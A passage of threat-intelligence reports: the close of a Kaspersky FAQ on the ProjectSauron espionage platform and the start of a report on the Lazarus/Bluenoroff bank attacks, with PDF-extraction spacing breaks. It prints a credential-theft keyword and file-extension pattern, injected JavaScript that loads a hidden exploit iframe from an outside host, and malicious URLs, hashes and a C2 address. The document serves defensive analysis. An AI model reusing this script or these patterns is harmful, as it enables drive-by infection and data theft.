ProjectSauron malware that leverages the DNS protocol is the real-time reporting of the operation progress to a remote server. Once an operational milestone is achieved, ProjectSauron issues a DNS-request to a special subdomain unique to each target.\\n15. What is the most sophisticated feature of the ProjectSauron APT?\\nIn general, the ProjectSauron platform is very advanced and reaches the level of complexity of Regin, Equation and similar threat actors we have reported on in the past. Some of the most interesting things in the ProjectSauron platform include:\\nMultiple exfiltration mechanisms, including piggybacking on known protocols.\\nBypassing air-gaps using hidden data partitions on USB sticks.\\nHijacking Windows LSA to control network domain servers.\\nImplementing an extended Lua engine to write custom malicious scripts to control the entire malware platform with a high-level language.\\n16. Are the attackers using any zero-day vulnerabilities?\\nTo date we have not found any 0-day exploits associated with ProjectSauron.\\nHowever, when penetrating isolated systems, the creation of the encrypted storage area in the USB does not in itself enable attackers to get control of the air-gapped machines. There has to be another component such as a 0\\xadday exploit placed on the main partition of the USB drive.\\nSo far we have not found any 0-day exploit embedded in the body of the malware we analyzed, and we believe it was probably deployed in rare, hard-to-catch instances.\\n17. Is this a Windows-only threat? What versions of Windows are targeted?\\nProjectSauron works on all modern Microsoft Windows operating systems – both x64 and x86. We have witnessed infections running on Windows XP x86 as well as Windows 2012 R2 Server Edition x64.\\nTo date, we haven’t found a non-Windows version of ProjectSauron.\\n18. Were the attackers hunting for specific information?\\nProjectSauron actively searches for information related to rather uncommon, custom network encryption software. This client-server software is widely adopted by many of the target organizations to secure communications, voice, email, and document exchange.\\nIn a number of the cases we analyzed, ProjectSauron deployed malicious modules inside the custom network encryption’s software directory, disguised under similar filenames and accessing the data placed beside its own executable. Some of extracted Lua scripts show that the attackers have a high interest in the software components, keys, configuration files, and the location of servers that relay encrypted messages between the nodes.\\nAlso, one of the embedded ProjectSauron configurations contains a special unique identifier for the targeted network encryption software’s server within its virtual network. The behavior of the component that searches for the server IP address is unusual. After getting the IP, the ProjectSauron component tries to communicate with the remote server using its own (ProjectSauron) protocol as if it was yet another C&C server. This suggests that some communication servers running the mentioned network encryption software could also be infected with ProjectSauron.\\n19. What exactly is being stolen from the targeted machines?\\nThe ProjectSauron modules we found are able to steal documents, record keystrokes and steal encryption keys from infected computers and attached USB sticks.\\nThe fragment of configuration block below, extracted from ProjectSauron, shows the kind of information and file extensions the attackers were looking for:\\n.*account.*|.*acct.*|.*domain.*|.*login.*|.*member.*|.*user.*|.*name|.*email|.*_id|id|uid|mn|mailaddress|.*nick.*|alias|codice|uin|sign-in|strCodUtente|.*pass.*|.*pw|pw.*|additional_info|.*secret.*|.*segreto.*\\n[^\\\\$]$\\n^.*\\\\.(doc|xls|pdf)$\\n*.txt;*.doc;*.docx;*.ppt;*.pptx;*.xls;*.xlsx;*.vsd;*.wab;*.pdf;*.dst;*.ppk;*.rsa;*.rar;*.one;*.rtf;~WPL*.tmp;*.FTS;*.rpt;*.conf;*.cfg;*.pk2;*.nct;*.key;*.psw\\nInterestingly, while most of the words and extensions above are in the English language, several of them point to Italian, such as: ‘codice’, ‘strCodUtente’ and ‘segreto’.\\nKeywords / filenames targeted by ProjectSauron data theft modules:\\nItalian keyword\\nTranslation\\nCodice\\ncode\\nCodUtente\\nUsercode\\nSegreto\\nSecret\\nThis suggests the attackers had prepared to attack Italian-speaking targets as well. However, we are not aware of any Italian victims of ProjectSauron at the moment.\\n20. Have you observed any artifacts indicating who is behind the ProjectSauron APT?\\nAttribution is hard and reliable attribution is rarely possible in cyberspace. Even with confidence in various indicators and apparent attacker mistakes, there is a greater likelihood that these are smoke and mirrors created by an attacker with a greater vantage point and vast resources. When dealing with the most advanced threat actors, as is the case with ProjectSauron, attribution becomes an unsolvable problem.\\n21. Is this a nation-state sponsored attack?\\nWe think an operation of such complexity, aimed at stealing confidential and secret information, can only be executed with support from a nation-state.\\n22. What would ProjectSauron have cost to set up and run?\\nKaspersky Lab has no exact data on this, but estimates that the development and operation of ProjectSauron is likely to have required several specialist teams and a budget probably running into millions of dollars.\\n23. How does the ProjectSauron platform compare to other top-level threat actors?\\nThe actor behind ProjectSauron is very advanced, comparable only to the top-of-the-top in terms of sophistication: alongside Duqu, Flame, Equation, and Regin. Whether related or unrelated to these advanced actors, the ProjectSauron attackers have definitely learned from them.\\nAs a reminder, here are some features of other APT attackers which we discovered that the ProjectSauron attackers had carefully learned from or emulated:\\nDuqu:\\nUse of intranet C&Cs (where compromised target servers may act as independent C&Cs)\\nRunning only in memory (persistence on a few gateway hosts only)\\nUse of different encryption methods per victim\\nUse of named pipes for LAN communication\\nMalware distribution through legitimate software deployment channels\\nFlame:\\nLua-embedded code\\nSecure file deletion (through data wiping)\\nAttacking air-gapped systems via removable devices\\nEquation and Regin:\\nUsage of RC5/RC6 encryption\\nVirtual Filesystems (VFS)\\nAttacking air-gapped systems via removable devices\\nHidden data storage on removable devices\\nThese other actors also showed what made them vulnerable to potential exposure, and ProjectSauron did its best to address these issues:\\nVulnerable or persistent C&C locations\\nISP name, IP, domain, and tools reuse across different campaigns\\nCrypto-algorithm reuse (as well as encryption keys)\\nForensic footprint on disk\\nTimestamps in various components\\nLarge volumes of exfiltrated data, alarming unknown protocols or message formats\\nIn addition, it appears that the attackers took special care with what we consider as indicators of compromise and implemented a unique pattern for each and every target they attacked, so that the same indicators would have little value for anyone else. This is a summary of the ProjectSauron strategy as we see it. The attackers clearly understand that we as researchers are always looking for patterns. Remove the patterns and the operation will be harder to discover. We are aware of more than 30 organizations attacked, but we are sure that this is just a tiny tip of the iceberg.\\n24. Do Kaspersky Lab products detect all variants of this malware?\\nAll Kaspersky Lab products detect ProjectSauron samples as HEUR:Trojan.Multi.Remsec.gen\\n25. Are there Indicators of Compromise (IOCs) to help victims identify the intrusion?\\nProjectSauron’s tactics are designed to avoid creating patterns. Implants and infrastructure are customized for each individual target and never re-used – so the standard security approach of publishing and checking for the same basic indicators of compromise (IOC) is of little use.\\nHowever, structural code similarities are inevitable, especially for non-compressed and non-encrypted code. This opens up the possibility of recognizing known code in some cases.\\nThat’s why, alongside the formal IOCs, we have added relevant YARA rules.\\nWhile the IOCs have been listed mainly to give examples of what they look like, the YARA rules are likely to be of greater use and could detect real traces of ProjectSauron.\\nFor background: YARA is a tool for uncovering malicious files or patterns of suspicious activity on systems or networks that share similarities. YARA rules—basically search strings—help analysts to find, group, and categorize related malware samples and draw connections between them in order to build malware families and uncover groups of attacks that might otherwise go unnoticed.\\nWe have prepared our YARA rules based on tiny similarities and oddities that stood out in the attackers’ techniques. These rules can be used to scan networks and systems for the same patterns of code. If some of these oddities appear during such a scan, there is a chance that the organizations has been hit by the same actor.\\nMore information about ProjectSauron is available to customers of Kaspersky Intelligence Reporting Service.

       " 'https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf': 'LAZARUS UNDER THE HOOD Executive Summary The Lazarus G Its malware has been found in many serious cyberattacks, such as the massive data leak and file wiper attack on Sony Pictures Entertainment in 2014 ; the cyberespionage campaign in South Korea , dubbed Operation Troy , in 2013 ; and Operation DarkSeoul , which attacked South Korean media and financial companies in 2013 . There have been several attem pts to attribute one of the biggest cyberheist s, in Bangladesh in 2016 , to Lazarus G roup. Researchers discovered a similarity between the backdoor used in Bangladesh and code in one of the Lazarus wiper tools. This was the first attempt to link th e attack back to Lazarus. However, as new facts emerged in the media , claiming that there were at least three independent attackers in Bangladesh , any certainty about who exactly attacked the banks systems , and was behind one of the biggest ever bank heists in history , vanished. The only thing that was certain was that Lazarus malware was used in Bangladesh . Howe ver, considering that we had previously found Lazarus in dozens of different countries, including multiple infections in Bangladesh , this was not very convincing evidence and m any security researchers expressed skepticism abound th is attribution link. Thi s paper is the result of forensic investigations by Kaspersky Lab at banks in two countries far apart . It reveals new modules used by Lazarus group and strongly links the tools used to attack systems supporting SWIFT to the Lazarus G arsenal of lateral movement tools. Considering that Lazarus G roup is still active in various cyberespionage and cybersabotage activities , we have segregated its subdivision focusing on attacks on banks and financial manipulations into a separate group which we call Bluenoroff (after one of the tools they used). Introduction Since the beginning of 2016 , the cyberattack against the Bangladesh C entral B ank , which attempt ed to steal almost 1 billion USD , has been in the spotlight of all major news outlets. New , scattere d facts popped up as the investigation developed and new incidents were made public , such as claims by the Vietnamese Tien Phon g bank about the prevention of the theft of 1 million USD in December 2015. Security companies quickly picked up some patterns in the tools used in those attacks and link ed them to Lazarus G roup. its activity spike d from 2011. The group has deployed multiple malware families across the years, including malware associated with Operation Troy and DarkSeoul, the Hangman malware (2014 - 2015) and Wild Positron/Duuzer (2015). The group is known for spearphishing attacks, which include CVE - 2015 - 6585 , a zero day vulnerability at the time of i ts discovery. The last major set of publications on the Lazarus actor was made possible due to a security industry alliance lead by Novetta . The respective research announcement was dubbed Operation Blo ckbuster . The following quote from Novetta\\'s report , about the purpose of the research , caught our eye: \" While no effort can completely halt malicious operations, Novetta believes that these efforts can help cause significant disruption and raise operating costs for adversaries, in addition to profiling groups that have relied on secrecy for much of their success. \" Bluenoroff: a Child of Lazarus Clearly , even before the Operation Blockbuster announcement , Lazarus had an enormous budget for its operation s and would need a lot of money to run its campaigns. Ironically, Novetta\\'s initiative could have further increased the already rising oper ating costs of Lazarus attacks, which in turn demanded better financing to continue its espionage and sabotage operations. So, one of the new objectives of Lazarus G roup could be to become self - sustaining and to go after money. This is whe re Bluenoroff, a Lazarus unit, enters the s tory . Based on our analysis, we believe this unit works within the larger Lazarus G roup, reusing its backdoors and leveraging the access it created , while penetrating targets that have large financial streams. Of course it implies a main focus on banks, but banks are not the only companies that are appearing on the radar of Bluenoroff: financial companies, traders and casinos also fall within Bluenoroff area of interest. Novetta\\'s report doesn\\'t provide strict attribution, linki ng only to the FBI\\'s investigation of the Sony Pictures Entertainment hack and a strong similarity in the malware tools. Some time later, the media carried additional facts about how strong the FBI\\'s claims were, supporting this with some data a llegedly from the NSA . The deputy director of the NSA, Richard Ledgett recently commented on Lazarus and its link to North Korea, however no new evidence of this link has been provided. Since the incident in Bangladesh, Kaspersky Lab has been tracking the actor going after systems supporting SWIFT messaging, collecting information about its new attacks and operations. The recently discovered massive attack against banks in Europe in February 2017 w as also a result of this tracking. High ly importan t malicious activity was detected by Kaspersky Lab products in multiple European financial institutions in January 2017 and this news eventually ended up being publi shed by the Polish media . The j ournalist investigation s jumped slightly ahead of technical investigations and disclosed some facts before the analysis was finished. When it comes to Lazarus, the investigation and discovery of new facts is a long chain of events which consist of forensic and reverse engineering stages followin g one another . H ence, results cannot be made available immediately. Previous Link t o Lazarus G roup Since the Bangladesh incident there have been just a few articles explaining the connection between Lazarus G roup and this particular heist . One was published by BAE systems in May 2016, however , it only included an analysis of the wiper code. This was followed by another blogpost by Anomali Labs confirming the same wiping code similarity. This similarity was found to be satisfying to many readers, but we wanted to look for a stronger connection. Other claims that the attacker targeting the financial sector in Poland was Lazarus G roup came from Symantec in 2017, which noticed string reuse in malware used at one of their Polish customers. Symantec also confirmed seeing the Lazarus wiper tool in Poland at one of their customers, however from this it\\'s only clear that Lazarus might have attacked Polish bank s. While all these facts look fascinating, the connection between Lazarus attacks on banks and its role in attacks their back office operations was still a loose one . The only case where malware targeting the infrastructure used to connect to SWIFT was di scovered is the Bangladesh C entral B ank incident . However, while almost everybody in the security industry has heard about the attack , few technical details based on the investigation that took place on site at the attacked company ha ve been revealed to the public . Considering that the post - hack stories in the media mentioned that the investigation stumbled upon three different attackers , it was not obvious whether Lazarus was the one responsible for the fraudulent SWIFT transactions , or if Lazarus had in fact developed its own malware to attack the banks\\' systems . In addition, relying solely on a single si milarity based on file wiping code makes the connection not as strong, because the secure file wiping procedure is a utility function that can be used in many non - malware related projects. Such code could be circulating within certain software developer communit ies in Asia. One such example is an open - source project called sderase available with sourcecode at SourceForge , submitted by a developer wi th an Asian looking nickname - zhaoliang86. We assumed that it\\'s possible that there are many other projects like sderase available on Asian developer forums , and code like this could be borrowed from them. We would like to add a few strong facts that lin k some attacks on banks to Lazarus , to share some of our own findings and to shed light on the recent TTPs (Tactics, Techniques and Procedures) used by the attacker, including some as yet unpublished details from the attack in Europe in 2017. Incident #1 T he incident happened in a South E ast Asian country in August 2016 , when Kaspersky Lab products detected new malicious activity from the Trojan - Banker.Win32.Alreay malware family. This malware was linked to the arsenal of tools used by the attackers in Bang ladesh. As the attacked organization was a bank, we decided to investigate this case in depth. During the months of cooperation with the bank that followed, we revealed more and more tools hidden deep inside its infrastructure. We also discovered that the attackers had learned about our upcoming investigation and wip ed all the evidence they could, including tools, configuration files and log records. I n their rush to disappear they managed to forget some of the tools and components , which remained in the sy stem . Malware Similarity Just like other banks that have their own dedicated server to connect to SWIFT , the bank in I ncident #1 had its own. The server was running SWIFT Alliance software. Since the notorious Bangladesh cyberattack , the SWIFT Alliance software has been updated to include some additional checks which verify software and database integrity. This was an essential and logical measure as attackers had show n attempts to tamper with SWIFT software Alliance on disk and in memory, disabling dir ect database manipulations , as previously reported in the analysis by BAE Systems. This was discovered by the attackers, who tracked the changes in SWIFT Alliance software. The malware tools found in Incident #1 suggested that the attackers had carefully analyzed the patches and implemented a better way to patch new changes. More details on the patcher tool are provided in the A ppendix. The malware discovered on the server conne cted to SWIFT strongly linked Incident #1 to the incident in Bangladesh. While certain tools were new and different in the malware code, the similarities left no doubt that the attacker in Incident #1 used the same code base. Below are some of the identical code and encryption key patterns that we found. Sample submitted from Bangladesh and mentioned in the BAE Systems blog . MD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee Sample discovered in Incident #1 to copy SWIFT message files to separate storage. MD5:f5e0f57684e9da7ef96dd459b554fded The screenshot above shows the disassembly of the logging function implemented in the malware. The code is almost identical. It was imp roved a little by adding current process ID to the log record. Never stopping code modification by the developer seems to be one of long - term strategies: it keep s changing the code even if it doesn\\'t introduce much new functionality. C hanging the code break s Y ara recognition and other signature - based detections. Another example of changing code , while preserving the core idea , originates from Novetta\\'s sample set. One of the Lazarus malware modules that Novetta discovered used a binary configuration file that was encrypted with RC4 and a hardcoded key. A fragment of the code that loads, decrypts and verifies config file magic is shown below. Note that the first DWORD of the decrypted data has to be 0xAABBCCDD. The new variants of Lazarus malware used since Novetta publication included a different code, with a new magic number and RC4 key , but following the same idea. Sample submitted from Bangladesh. Uses magic value 0xA0B0C0D0 MD5: 1d0e79feb6d7ed23eb1bf7f257ce4fee Sam ple discovered in Incident #1. Uses magic value 0xA0B0C0D0 MD5: f5e0f57684e9da7ef96dd459b554fded The code above is used to read, decrypt and check the external config file. You can see how it was modified over time. The sample from Incident #1 has certain differences which would break regular binary pattern detection with Yara . H owever , it\\'s clearly the same but improved code. Instead of reading the file once, malware attempts to read it up to five times with a delay of 100ms. Then it decrypts the file with a hardcoded RC4 key, which is an identical 16 bytes in both samples ( 4E 38 1F A7 7F 08 CC AA 0D 56 ED EF F9 ED 08 EF ) , and verifies the magic value which must be 0xA 0B0C0D0 . According to forensic analysis , this malware was used by an actor who had remote access to the system via its own custom set of backdoors. Most of the analyzed hosts were not directly controlled via a C2 server . I nstead they connected to another internal host that relayed TCP connection to the C2 using a tool that we dubbed the TCP Tunnel Tool. This tool can be used to chain internal hosts within the organization and relay connection to the real C2 server. This makes it harder for admi nistrators to identify compromised hosts, because local connections usually seem less suspici ous . One very similar tool was also described by Novetta, which it dubbed Proxy PapaAlfa . This tool is one of the most popular during an attack. Some hosts were used only as a relay, with no additional malware installed on them. That\\'s why we believe that the Lazarus actor has many variants of this tool and changes it often to scrutinize network or file - based detection. For full the technical details of the tool discovered in Incident #1 see Appendix (MD5: e62a52073fd7bfd251efca9906580839). One of the central hosts in the bank, which was running SWI FT Alliance software , contained a full y - fledged backdoor (MD5: 2ef2703cfc9f6858ad9527588198b1b6) which has the same strong code and protocol design as a family of backdoors dubbed Romeo by Novetta . The same , but packed , backdoor was uploaded to a multiscanner service from Poland and South Korea in November 2016 (MD5: 06cd99f0f9f152655469156059a8ea25). We believe that this was a precursor of upcoming attacks on Poland and other European countries, however this was not reported publicly in 2016. The same malware was delivered to the European banks via an exploit attack in January 2017. There are many other visible similarities between the Lazarus malware reported by Novetta and malware discovered in Incident #1, such as an API import procedure and a complicated custom PE loader. The PE loader was used by many malware co mponents: DLL loaders, injectors, and backdoors. LimaAlfa sample from Novetta\\'s Lazarus malware set (loader of other malicious files). MD5: b135a56b0486eb4c85e304e636996ba1 Sample discovered in Incident #1 (backdoor which contains PE loader code). MD5: bbd703f0d6b1cad4ff8f3d2ee3cc073c Note that the modules presented differ in file type and purpose: Novetta\\'s sample is an EXE file which is used to load other malicious PE files , while the sample discovered in Incident #1 is a DLL backdoor. Still , t hey are based on an identical code base. The discussion about similarities can be continued . H owever , it\\'s now very clear that the attack in Bangladesh and Incident #1 are linked through the use of the Lazarus malware arsenal. Forensic Findings on the Server Connected to SWIFT In the case of the South East Asian attack we have seen infections both on the server connecting to SWIFT and several systems that belong to the IT department of the company. We managed to recover most of the modules, while some o thers were securely wiped and became inaccessible for analysis. Nevertheless , in many cases we see references to unique filenames that were also seen on other infected systems and were most likely malicious tools. As we learned from the analysis of this in cident, there are cross - victim event correlations, which suggest that attackers worked in multiple compromised banks at the same time. Here are our key takeaways from the forensic analysis: The attackers had a foothold in the company for over seven months. The South East Asian bank was breached at the time when the Bangladesh heist happened. Most of the malware was placed into a C: \\\\ Windows directory or C: \\\\ MSO10 directory. These two paths were hardcoded into several modules. The malware was compiled days or sometimes hours before it was deployed , which suggests a very targeted and surgical operation. The attackers used an innocent looking decryptor with a custom PE loader designed to bypass detections by security products on start. Most of the modules are des igned to run as a service or have administrative/SYSTEM rights. The backdoors found in this attack on the server connecting to SWIFT matched the design described by Novetta as a Romeo family of backdoors (RATs) in their paper, which directly links the South East Asian case to Lazarus. Not everything ran smoothly for the attacker. We found multiple events of process crashes and system restarts during the time of the alleged attacker presence. Attackers operated out of office hours according to the vict im\\'s schedule and timezone to avoid detection. They attempted to debug some problem s by enabling the sysmon driver for several hours. Later , they forgot to wipe the sysmon event log file , which contained information on running processes, their respective c ommandlines and file hashes. There was specific malware targetting SWIFT Alliance software that disabled internal integrity checks and intercepted processed transaction files. We called this SWIFT targeted malware and directly attribute authorship to the Bluenoroff unit of Lazarus. The SWIFT malware is different from other Lazarus tools, because it lacks obfuscation, disguise and packing. Persistence was implemented as Windows service DLL, registered inside the group of Network Services (netsvcs). They us ed a keylogger, which was stored in an encrypted container . This was decrypted and loaded by a loader that fetched the encrypted information from a different machine (disguised as one of the files in C: \\\\ Windows \\\\ Web \\\\ Wallpaper \\\\ Windows \\\\ ). The attackers pa t che d SWIFT Alliance software modules on disk perma n ently, but later rolled back the changes. Another operational failure was forgetting to restore the patched module in the backup folder. The p atch applied to the liboradb.dll module is very similar to the one described by BAE Systems in its article about the Bangladesh attacks. Attackers used both passive and active b ackdoors. The passive backdoors listened on the TCP port which was opened in Firewall via a standard netsh.exe command. That left additional records in system event log files. The port was set in the config , or passed as a command - line argument. They prefe r ports ending with 443, i.e. 6443, 8443, 443 . Internal SWIFT Alliance software logs contained several alerts about database failures from June to August 2016, which links to attackers attempts to tamper with the database of transactions. The attackers di dn\\'t have visual control of the desktop through their backdoors which is why they relied on their own TCP tunnel tools that forwarded RDP port s to the operator. As a result we identified the anomalous activity of Terminal Services: they worked late and som etimes during weekends. One of the earliest Terminal Services sessions was initiated from the webserver hosting the company\\'s public website. The webserver was in the same network segment as the server connected to SWIFT and was most likely the patient zero in this attack. Timeline of Attacks Due to long - term cooperation with the bank we had the chance to inspect several compromised hosts in the bank. Starting with analysis of the central host , which was the server connecting to SWIFT; we could see connections to other hosts in the network. We suspected them to be infected and this was confirmed during a closer look. Once the contact between that bank and Kaspersky Lab was established, the attackers somehow realized that the behavior of system administrators was not normal and soon after that they started wiping all traces of their activity. Revealing traces of their presence took us a couple of months, but we managed to collect and build a rough timeline of some of their operations, which again provided us with activity time information. We have collected all timestamps that indicate the activity of the attacker s and put them in one table, which has helped us to build a timeline of events base d on the remain ing artefacts. Fig. Timeline of events in related to Incident #1. Synchronicity of Events in Different Incidents During the analysis of event log files we found one coming from Sysinternals Sysmon. Surprisingly , the event log file contained records of malware activity from months before the forensic analysis, logging some active work. When we discovered that strange s ysmon log we were confused, as it seemed like the attacker enabled it , or someone who wanted to monitor the attacker did. Later on, a securit y researcher familiar with the Bangladesh investigation results confirmed that similar s ysmon activity was also registered on 29 January 2016. This means that it happened to at least two different victims within minutes. Another event was related to tampe ring with SWIFT database modules. During the analysis of systems in Incident #1, we found a directory C: \\\\ Users \\\\ %username% \\\\ Desktop \\\\ win32 \\\\ which was created at 2016 - 02 - 05 03:22:51 (UTC). The directory contained a patched liboradb.dll file which was modifie d at 2016 - 02 - 04 14:07:07 (UTC) , while the original unpatched file seems to be created on 2015 - 10 - 13 12:34:26 (UTC) and stored in liboradb.dll.bak. This suggests attacker activity around 2016 - 02 - 04 14:07:07 (UTC) . This was the date of the widely publicized Bangladesh cyber heist. This finding corresponds to already known incident at Bangladesh Central Bank in February 2016. According to BAE was also Fig. Patched module in Bangladesh case (courtesy of BAE Systems). So far, this means that the attackers\\' activity and the file modification occurred on the same day in two banks in two different countries on 29 January , 2016 and 4 February , 2016 . To conclude, Bangladesh C entral B ank was probably one of many banks compromised for th e massive operation involving hundreds of millions of dollars. A bank in South East Asia linked to Incident #1 is live confirmation of this fact. Anti - Forensics Techniques Some of the techniques used by the attackers were quite new and interesting. We assu me that the attackers knew about the constraints implied by the responsibility of SWIFT and the bank when it comes to investigatin g a cyberattack. So far, all infected assets were chosen to be distributed between SWIFT connected systems and the bank own systems. By splitting the malicious payload into two pieces and placing them in two different zones of responsibility , the attackers attempted to achieve zero visibility from any of the parties that would investigate or analyze suspicious files on its side . We believe that involving a third - party like Kaspersky Lab makes a big change to the whole investigation . Technically it was implemented through a simple separation of files, which had to be put together to form a fully functioning malicious process. We have seen this approach at least tw ice in current forensic analysis and we strongly believe that it is not a coincidence. Malware Component 1 Malware Component 2 Description Trojan Dropper, igfxpers.exe was found on HostC Dropped Backdoor, was found on HostD The backdoor was dropped on the disk by the Dropper , if the operator started it with valid secret password , provided via commandline. DLL Injector, esserv.exe was found on HostD Keylogger, loaded by DLL Injector was found on HostA The Keylogger was stored in encrypted container and could only be loaded with the DLL Injector from another host. It\\'s common for forensic procedure s to be a pplied to a system as a whole. With standard forensic procedure s, which include the analysis of a memory dump and disk image of a compromised system , it is uncommon to look at a given computer as a half - compromised system, meaning that the other ingredient which makes it compromised live s elsewhere. However, in reality the system remains breached. It implies that a forensic analyst focusing on the analysis of an isolated single system may not see the full picture. That is why we believe that this technique was used as an attempt to prevent successful forensic analysis. With this in mind , we\\'d like to encourage all forensics analyst s to literally look outside of the box when conducting breach analysis, especially when you have to deal with Lazarus. Password Protected Malware Another interesting technique is in the use of password - protected malware. While this technique isn\\'t exactly new, it is usually a signature of advanced attackers. One such malware that comes to mind is the mysterious Gauss malware, which require s a secret ingredient to decrypt its protected payload. We published our research about Gauss malware in 2012 and since then many attempts hav e been made to crack the Gauss encryption passphrase , without any success. The idea is quite a simple yet very effective anti - forensics measure: the malware dropper (installer) uses a secret passphrase passed via command line argument. The argument is has hed with MD5 and is used as the key to decrypt the payload. In the context of the Incident #1 attack, the payload was , in turn , a loader of the next stage payload , which was encrypted and embedded into the loader. The loader didn\\'t have the key to decrypt its own embedded payload, but it looked for the decryption key in the registry value. That registry value should have to be set by the installer , otherwise the malware doesn\\'t work. So, clearly , unless you have the secret passphrase , you cannot reconstruct the full chain of events. In the case of Incident #1 we managed to get the passphrase and it was a carefully selected string consisting of 24 random alpha - numeric upper and lowercase characters. About The Infection Vector Due to the age of the breach ins ide the bank , little has been preserved and it\\'s not very clear how the attackers initially breached the bank. However, what becomes apparent is that they used a web server located in the bank to connect via Terminal Services to the one linking to SWIFT co nnected systems . In some cases they would switch from the web server to another internal infected host that would work as a relay . H owever , all the hosts that we analyzed had no interaction with the external world except for the web server mentioned , which hosted the company\\'s website and was exposed to the world. The web server installation was quite fresh : it had hosted the c ompany\\'s new website , which was migrated from a previous server , for just a few months before it was compromised. The bank co ntracted a pentesting company to do a security assessment of the new website which was ongoing when Lazarus breached the server. The infection on the web server appeared in the middle of pentesting probes. Some of these probes were successful and the pente ster uploaded a C99 - like webshell to the server as a proof of breach. Then the pentester continued probing other vulnerable scripts on the server, which is why we believe that the intention was benign. In the end, all scripts discovered by the pentester we re reported and patched. Considering that there were known breaches on the webserver, which were identified and patched with the help of an external security audit, there is a high probability that the server was found and breached by the Lazarus actor be fore the audit. Another possibility is that the C99 - shell uploaded by the pentester was backdoored and beaconed back to the Lazarus G roup , which immediately took over the server. Unfortunately , the C99 - shell was identified only by the query string, the bod y of the webshell was not recovered. On e way or another, the breach of the web server seems to be the most probable infection vector used by Lazarus to enter the bank network. Incident #2 Our investigation in Europe started with very similar symptoms t o those which we have previously seen in South E ast Asia in Incident #1. In January 2017 we received information about new detections of the Blue n oroff malware we have been tracking. One of the alarming triggers was the sudden deployment of freshly built s amples, which indicated that a new serious operation had beg u n. After establishing a secure communication with some of the targets , we passed some indicators of compromise and quickly got some feedback confirming the hits. Thanks to the support and cooperation of a number of partners, we managed to analyse multiple harddrive disk images that were made soon after taking the identified compromised systems offline . Analysis of the disk images revealed the presence of multiple malware tools associated with the Bluenoroff unit of the Lazarus G roup. Analysis of the event logs indicate that several hosts were infected and other hosts had been targeted by the attackers for lateral movement operations. Attackers attempted to access the domain cont roller and mail server inside the companies, which is why we recommend that future investigators should avoid using corporate email for communicatin g with victims of Lazarus G roup . In one case, the initial attack leveraged an old vulnerability in Adobe Fl ash Player, which was patched by Adobe in April 2016. Although an updater was installed on this machine, it failed to update Adobe Flash Player, probably due to network connectivity issues. Initial Infection. In one of the incidents, we discovered th at p atient zero visited a compromised government website using Microsoft Internet Explorer on 10 January, 2017. Infected webpage URL: https://www.knf.gov[.]pl/opracowania/sektor_bankowy/index.html The time of the visit is confirmed by an Internet Explorer cache file , which contains an html page body from this host. The webpage loaded a Javascript resource from the same webserver referenced from the page: <script type=\"text/javascript\" src=\" /DefaultDesign/Layouts/KNF2013/resources/accordian - src.js?ver=11 \"> </script> The i nformation provided below appeared in the public domain . Preliminary investigation suggests that the starting point for the infection could have been located on the webserver of a P olish financial sector regulatory body, Polish Financial Supervision Authority (www.knf.gov[.]pl). Due to a slight modification of one of the local JS files, an external JS file was loaded, which could have executed malicious payloads on selected targets . Note: image is a courtesy of badcyber.com The unauthorised code was located in the followin g file: http://www.knf.gov[.]pl/DefaultDesign/Layouts/KNF2013/r esources/accordian - src.js?ver=11 and looked like this : document.write(\"<div id=\\'efHpTk\\' width=\\'0px\\' height=\\'0px\\'><iframe name=\\'forma\\' src=\\' https://sap.misapor[.]ch/vishop/view.jsp?pagenum=1 \\' width=\\'145px\\' height=\\'146px\\' style=\\'left: - 2144px;position:absolute;top :0px;\\'></iframe></div>\"); After successful exploitation , malware was downloaded to the workstation, where, once executed, it connected to some foreign servers and could be used to perform network reconnaissance, lateral movement and data exfiltration . Visiting the exploit page resulted in Microsoft Internet Explorer crashing , which was recorded with a process dump file. The dumped process included the following indicators: [version=\"2\"] [swfURL=\" https://sap.misapor[.]ch/vishop/include/cambio.swf \" pageURL=\" https://sap.misapor[.]ch/vishop/view.jsp \"]... Additional research by Kaspersky Lab discovered that the exploit file at hxxp://sap.misapor[.]ch:443/vishop/include/cambio.swf resulted in the downl oad of a backdoor module. Based on our own telemetry, Kaspersky Lab confirms that sap.misapor[.]ch was compromised as well , and was spreading exploits for Adobe Flash Player and Microsoft Silverlight. Some of the known vulnerability CVEs observed in attack s originat e from that website: 1. CVE - 2016 - 4117 2. CVE - 2015 - 8651 3. CVE - 2016 - 1019 4. CVE - 2016 - 0034 The Flash exploit used in the attacks was very similar to known exploit s from the Magnitude Exploit Kit. These vulnerabilities have been patched by Adobe and Microsoft since April 2016 and January 2016 respectively. Fig. Part of the exploit code load from: https://sap[.]misapor.ch/vishop/view.jsp?uid=[redacted]&pagenum=3&eid=00000002&s=2 &data= It\\'s worth mention ing here that Lazarus used other false flags in conjunction with this Russian exploit code. They also used some Russian words in one of the backdoor s and packed the malware with a commercial protector (Enigma) developed by a Russian author. However, the Russi an word s in the backdoor looked like a very cheap imitation, because every native Russian speaking software developer quickly notice d how odd these commands were . Fig. Russian words in the backdoor code. At the time of research this URL was dead but we w ere able to find an identical one which leads to a malicious file download (MD5: 06cd99f0f9f152655469156059a8ea25 , detected as Trojan - Banker.Win32.Alreay.gen) from http://www.eye - watch[.]in/design/img/perfmon.dat. Interestingly, this sample was uploaded t o VirusTotal from Poland and Korea in November 2016. It is a packed version of a previously known backdoor used by Lazarus attackers in Incident #1 bank. What Made t he Breach Possible - days, the infiltration was s uccessful because of non - updated software. In one case, we observed a victim running the following software: The exploit breached the system running Adobe Flash Player, version 20.0.0.235 . This version was officially released on 8 December , 2015 . Adobe implemented a self - update mechanism for Flash Player some years ago and the analyzed system indeed had a scheduled job, which attempted to periodically update Adobe Flash Updater. We checked the event logs of the Task Scheduler and this task was regularly running. T he task was started as SYSTEM user and attempted to connect to the I nternet to fetch Flash Player updates from fpdownload.macromedia.com . However, this attempt failed , either because it couldn\\'t find the proxy server to connect to the update ser ver , or because of missing credentials for the proxy. The last failed attempt to update Adobe Flash was dated in December 2016, a month before the breach happened. If only that updater could have accessed the I nternet the attack would have failed. This is an important issue that may be widely present in many corporate networks. Lateral Movement. Backup Server. After the initial breach the attackers pivoted from infected host s and emerged to migrate to a safer place for persistence. A backup server was chosen as the next target. Based on traffic logs provided for our analysis , we confirmed that there were connections to known Bluenoroff C2 servers originating from infected ho st s . The following information was found in the network logs: Destination:Port Type Bytes Transfered 82.144.131[.]5:8080 I ncomplete Less than 1KB 82.144.131[.]5:443 SSL Less than 3KB By checking other non - whitelisted hosts and IP ranges we were able to 